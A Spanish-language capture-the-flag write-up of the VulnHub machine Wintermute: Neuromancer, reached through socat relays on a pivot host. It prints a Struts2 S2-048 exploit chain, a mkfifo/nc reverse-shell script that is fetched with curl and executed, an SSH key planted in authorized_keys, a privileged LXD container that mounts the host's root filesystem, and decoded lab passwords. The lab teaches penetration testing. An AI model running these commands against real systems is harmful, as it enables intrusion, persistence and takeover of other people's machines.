---
title: "Wintermute: Neuromancer"
date: 2026-10-27
categories: [VulnHub, Medium]
tags: [linux, tomcat, struts2, cve-2017-9791, ognl, RCE, lxd, lxc, privilege escalation, pivoting, port forwarding, double pivot, html entity encoding, reverse shell, searchsploit, python, netcat, socat, ssh, scp]
image:
  path: /assets/img/VulnHub/Wintermute-Neuromancer/banner.webp
  lqip: "data:image/webp;base64,UklGRroAAABXRUJQVlA4IK4AAAAwBQCdASogACAAPu1mqk6ppaOiKA1RMB2JYgAu/8dwGOJ8oAU59qKVhEVdqVPlbOjiIAD++QrQzaiufU1rP4OT2g6Ljl5BPnCNggARxn3XEdsBGag1LY524sK13SuQfHuWkfXxF8sII43/OhFC/1uOxW3vUtDbDsVA6umdBDM1Tpft6nROe95SLxYKT1f+LBJpZCIAYxfMSSL7H7P+MjrbEdizitbCJMSBhlYAAAA="
  alt: "Wintermute: Neuromancer writeup"
lab:
  name: Wintermute
  order: 2
---

Neuromancer es la segunda mitad del laboratorio de pivoting **Wintermute: 1** — la máquina que solo vive en la red interna `10.0.0.0/24`, sin ruta desde mi host. La alcanzo enteramente *a través* de [Straylight](/es/posts/wintermute-straylight/), que ya rooteé y convertí en pivot. Desde ahí es una cadena propia: **Apache Struts2 S2-048** (**CVE-2017-9791**) para un punto de apoyo como `ta` — entregado como una reverse shell rebotada de vuelta por un *segundo* relay `socat` — acceso estable por SSH, y una pertenencia al **grupo LXD** que es root por diseño. La parte difícil aquí no es el exploit, es enrutar la shell de vuelta a casa a través de dos saltos; igual que con Straylight, mis scripts y sesiones están conservados en su totalidad.

| Campo      | Detalles       |
|------------|----------------|
| Plataforma | VulnHub        |
| Dificultad | Medium         |
| SO         | Linux          |
| IP         | 10.0.0.101 (interna — alcanzada vía el pivot de Straylight) |
| Descarga   | [Wintermute: 1](https://www.vulnhub.com/entry/wintermute-1,239/) |
| Fecha      | Octubre 2026   |

## Herramientas Usadas

| Herramienta | Descripción                                                           |
|-------------|-----------------------------------------------------------------------|
| nmap        | Escaneo de los puertos de Neuromancer a través del pivot             |
| searchsploit| Localizó el exploit de Struts2 S2-048                               |
| Python      | Staging con `http.server`, el exploit S2-048, decode de entidades HTML |
| netcat (nc) | El listener de la reverse shell                                     |
| socat       | El segundo pivot — rebotar la reverse shell de vuelta a mi host      |
| ssh / scp   | Acceso estable como `ta` y transferencia de ficheros por el pivot    |
| lxc         | Escalada de privilegios por contenedor LXD a root                   |

## Llegar a la Máquina

Todo lo de aquí corre contra el host oculto **detrás de [Straylight](/es/posts/wintermute-straylight/)**. En esa primera máquina (que rooteé por separado) monté relays `socat` que reenvían los puertos de Neuromancer hacia mi host — así que `192.168.57.6:<puerto>` alcanza a `10.0.0.101:<puerto>`:

```bash
# en straylight (el pivot): un relay por puerto
root@straylight:/tmp$ socat tcp-listen:8080,reuseaddr,fork tcp-connect:10.0.0.101:8080 &
root@straylight:/tmp$ socat tcp-listen:8009,reuseaddr,fork tcp-connect:10.0.0.101:8009 &
root@straylight:/tmp$ socat tcp-listen:34483,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

El montaje completo del pivot (segunda interfaz, barrido de ping, el escáner de puertos en Bash con `/dev/tcp`) está en el [writeup de Straylight](/es/posts/wintermute-straylight/#pivoting-hacia-neuromancer). Desde aquí trato `192.168.57.6:8080` como el Tomcat de Neuromancer.

## Reconocimiento a través del Pivot

Escanear los puertos reenviados revela a Neuromancer como si fuera local:

```bash
sudo nmap -p8080,8009,34483 -sCV 192.168.57.6 -oN nmap2
# 8009  ajp13   Apache Jserv (v1.3)
# 8080  http    Apache Tomcat 9.0.0.M26
# 34483 ssh     OpenSSH 7.2p2 Ubuntu
```

El `/root/note.txt` de Straylight apuntaba aquí: un despliegue de Tomcat en `/struts2_2.3.15.1-showcase`. Esa cadena de versión es toda la pista — Apache Struts 2.3.x Showcase es un objetivo de RCE muy conocido.

## Acceso Inicial — Apache Struts2 S2-048 (CVE-2017-9791) → `ta`

Apache Struts 2.3.x Showcase es vulnerable a **S2-048 / CVE-2017-9791** — una inyección OGNL en el plugin de integración de Struts 1 que da RCE. Exploit-DB 42324 lo automatiza:

```bash
searchsploit -m multiple/webapps/42324.py
```

### El doble pivot para la reverse shell

Hay una segunda mitad, más difícil, del túnel. El exploit ejecuta *comandos* en Neuromancer, pero Neuromancer solo puede alcanzar `10.0.0.x` — **no** a mi host en `192.168.57.1`. Así que una reverse shell tiene que rebotar también a través de Straylight. Monto un relay *inverso* en Straylight: escuchar en su IP interna y reenviar a mi host.

```bash
# en straylight: interna :5555  →  mi host 192.168.57.1:5555
root@straylight:/tmp$ socat tcp-listen:5555,reuseaddr,fork tcp-connect:192.168.57.1:5555 &
```

Un test de conectividad confirma el camino (Neuromancer → straylight:5555 → host): el exploit S2-048 hace que Neuromancer haga `curl` a la IP interna de Straylight, y llega al servidor Python de mi host:

```bash
python3 exploit.py http://192.168.57.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action 'curl http://10.0.0.100:5555/'
# en el host:  python3 -m http.server 5555  →  "GET / HTTP/1.1" 200
```

Un one-liner `bash -i >& /dev/tcp/...` plano no funcionó, así que preparé una reverse shell con `mkfifo`: alojar el script en Straylight (puerto 9999), hacer que el exploit lo descargue, le dé `chmod` y lo ejecute, con el callback apuntado a `10.0.0.100:5555` (que retransmite a mi host):

```bash
# reverseShell.sh:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.100 5555 >/tmp/f
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'curl http://10.0.0.100:9999/reverseShell.sh -o /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'chmod +x /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'sh /tmp/reverseShell.sh'
```

```bash
# listener en el host
nc -nlvp 5555
Connection received on 192.168.57.6 54128
$ whoami
ta
$ hostname -I
10.0.0.101
```

Una shell como **`ta`** en Neuromancer, tunelizada a través de dos saltos de socat.

### Acceso estable por SSH

Las reverse shells a ciegas son frágiles, así que monto SSH por clave a través del pivot. Primero reapunto el relay de SSH a un puerto local más amable (22 → el 34483 de Neuromancer), luego añado mi clave al `authorized_keys` de `ta` y conecto:

```bash
root@straylight:/tmp$ socat tcp-listen:22,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

```bash
ta@neuromancer:~$ ssh-keygen
ta@neuromancer:~$ echo "<clave pública de mi host>" > /home/ta/.ssh/authorized_keys
```

```bash
ssh -i id_rsa ta@192.168.57.6    # → neuromancer, vía el relay 22→34483
ta@neuromancer:~$ id
uid=1000(ta) ... groups=1000(ta),...,110(lxd),...
```

## Escalada de Privilegios — `ta` → `root` (grupo LXD)

`ta` es miembro del grupo **`lxd`**, y eso es efectivamente root: LXD permite a un miembro del grupo crear contenedores, y un contenedor *privilegiado* puede montar el **sistema de ficheros del host** y entrarse como root. La ruta estándar es una imagen mínima de Alpine (construida con [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)), copiada con `scp` a través del pivot SSH:

```bash
scp -i ~/.ssh/id_rsa alpine.tar.gz ta@192.168.57.6:/tmp/alpine.tar.gz
```

Luego la importamos, lanzamos un contenedor **privilegiado** con el `/` del host montado dentro, y caemos en una shell:

```bash
ta@neuromancer:/tmp$ lxc image import /tmp/alpine.tar.gz
ta@neuromancer:/tmp$ lxc image alias create privesc <fingerprint>
ta@neuromancer:/tmp$ lxc init privesc escalada -c security.privileged=true
ta@neuromancer:/tmp$ lxc config device add escalada host-root disk source=/ path=/mnt/root recursive=true
ta@neuromancer:/tmp$ lxc start escalada
ta@neuromancer:/tmp$ lxc exec escalada /bin/sh
~ # whoami
root
```

Dentro del contenedor somos root, y todo el disco del host está montado en `/mnt/root` — así que el `/root` del host es nuestro. Leo la flag y dejo mi clave en el `authorized_keys` de root para conseguir una sesión SSH de root limpia en el host:

```bash
~ # cat /mnt/root/root/flag.txt
REDACTED
~ # echo "<clave pública de mi host>" > /mnt/root/root/.ssh/authorized_keys
```

```bash
ssh -i .ssh/id_rsa root@192.168.57.6
root@neuromancer:~# whoami
root
```

Root en Neuromancer — ambas máquinas del laboratorio comprometidas, de principio a fin a través del pivot.

### Extra — caza de credenciales

Un barrido de los ficheros de configuración de Neuromancer saca varios secretos guardados que merece la pena anotar. El `settings.xml` de Maven tiene `proxyuser:proxypass` y `repouser:repopwd`, y el `tomcat-users.xml` de Tomcat esconde la contraseña de **Lady3Jane** tras entidades HTML (la idea del autor de "seguridad por oscuridad"):

```bash
ta@neuromancer:~$ python3 -c 'import html; print(html.unescape("&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;"))'
# >!Xx3JanexX!<
ta@neuromancer:~$ su lady3jane      # funciona
```

## Prueba de Root

| Host        | Fichero          | Prueba     |
|-------------|------------------|------------|
| neuromancer | `/root/flag.txt` | `REDACTED` |

## Conclusiones Clave

- **Encadena exploits a través del túnel.** Struts2 S2-048 es un RCE de un disparo, pero entregar una reverse shell funcional por un doble pivot requirió preparar un script con `mkfifo` y apuntar cada callback al relay (`10.0.0.100`), nunca al host inalcanzable. En redes segmentadas, el exploit es la parte fácil; el enrutado de la shell es el trabajo.
- **El pivoting va en ambos sentidos.** Alcanzar a Neuromancer requirió un reenvío `socat` por puerto en [Straylight](/es/posts/wintermute-straylight/) (hacia fuera); recuperar una shell requirió un *segundo* `socat` en Straylight apuntando hacia dentro, a mi host. Tener claras las dos direcciones — quién expone qué, a quién — es la habilidad central de una red multi-host.
- **Una cadena de versión en una ruta es una pista.** `/struts2_2.3.15.1-showcase` nombraba tanto el framework como la versión vulnerable exacta — `searchsploit` hizo el resto. Las rutas de despliegue verbosas y las apps de ejemplo por defecto (Struts Showcase, los examples de Tomcat) son RCE esperando a emparejarse con un CVE.
- **El grupo `lxd` es root.** La pertenencia a `lxd` dejó a `ta` montar el `/` del host en un contenedor privilegiado y leerlo/escribirlo como root — sin exploit de kernel. `lxd`, `docker`, `disk` y grupos similares son escalada de privilegios por diseño; trátalos como equivalentes a acceso root.
